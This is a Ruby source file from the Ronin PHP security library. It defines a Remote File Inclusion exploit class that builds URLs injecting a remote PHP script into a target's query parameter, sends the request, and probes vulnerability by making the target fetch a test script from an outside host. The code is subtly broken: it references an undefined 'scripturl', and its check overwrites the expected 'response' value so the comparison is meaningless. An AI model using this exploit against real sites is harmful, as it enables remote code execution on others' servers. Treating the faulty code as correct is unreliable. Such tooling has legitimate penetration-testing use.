#
# Ronin PHP - A Ruby library for Ronin that provides support for PHP
# related security tasks.
#
# Copyright (c) 2007-2010 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#

require 'ronin/exploits/web'
require 'ronin/formatting/digest'

module Ronin
  module Exploits
    class RFI < Web

      # Default URL of the RFI Test script
      TEST_SCRIPT = 'http://ronin.rubyforge.org/static/ronin/php/rfi/test.php'

      # Prefix text that will appear before the random RFI challenge string
      CHALLENGE_PREFIX = 'PHP RFI Response:'

      # The URL query param that can have remote files included into
      property :inclusion_param, String

      # Specifies whether to terminate the RFI script url with a `?`
      property :terminate, Boolean

      # The URL of the RFI test script
      parameter :test_script,
                :default => TEST_SCRIPT,
                :description => 'The URL of the RFI test script'

      #
      # Specifies the URL to the RFI testing script.
      #
      # @return [String]
      #   The URL to the RFI testing script.
      #
      # @since 0.2.0
      #
      def RFI.test_script
        @@ronin_rfi_test_script ||= TEST_SCRIPT
      end

      #
      # Uses a new URL for the RFI testing script.
      #
      # @param [URI::HTTP, String] new_url
      #   The new URL to the RFI testing script.
      #
      # @return [String]
      #   The new URL to the RFI testing script.
      #
      # @since 0.2.0
      #
      def RFI.test_script=(new_url)
        @@ronin_rfi_test_script = new_url.to_s
      end

      #
      # Builds a Remote File Inclusion URL.
      #
      # @param [String, URI::HTTP] script
      #   The URL of the PHP script to include remotely.
      #
      # @return [URI::HTTP]
      #   The URL to use to trigger the RFI.
      #
      # @since 0.2.0
      #
      def inclusion_url(script)
        script = URI(script.to_s)
        url = targeted_url

        url.query_params.merge!(script.query_params)
        script.query_params.clear

        script = "#{script}?" if self.terminate?

        url.query_params[self.inclusion_param] = scripturl
        return url
      end

      #
      # Performs a Remote File Inclusion (RFI).
      #
      # @param [String, URI::HTTP] script
      #   The URL of the PHP script to include remotely.
      #
      # @return [String]
      #   The body of the response from the RFI.
      #
      # @since 0.2.0
      #
      def include(script)
        options = {:url => inclusion_url(script)}

        case self.request_method
        when :post, 'post'
          return http_post_body(options)
        else
          return http_get_body(options)
        end
      end

      #
      # Tests whether the URL and query parameter are vulnerable to
      # Remote File Inclusion (RFI).
      #
      # @return [Boolean]
      #   Specifies whether the URL and query parameter are vulnerable
      #   to RFI.
      #
      # @since 0.2.0
      #
      def vulnerable?
        challenge = (rand(1000) ** 2)
        response = Math.sqrt(challenge).to_i

        test_url = URI(self.test_script)
        test_url.query_params['rfi_challenge'] = challenge

        response = include(test_url)
        return response.include?("#{CHALLENGE_PREFIX} #{response}")
      end

    end
  end
end
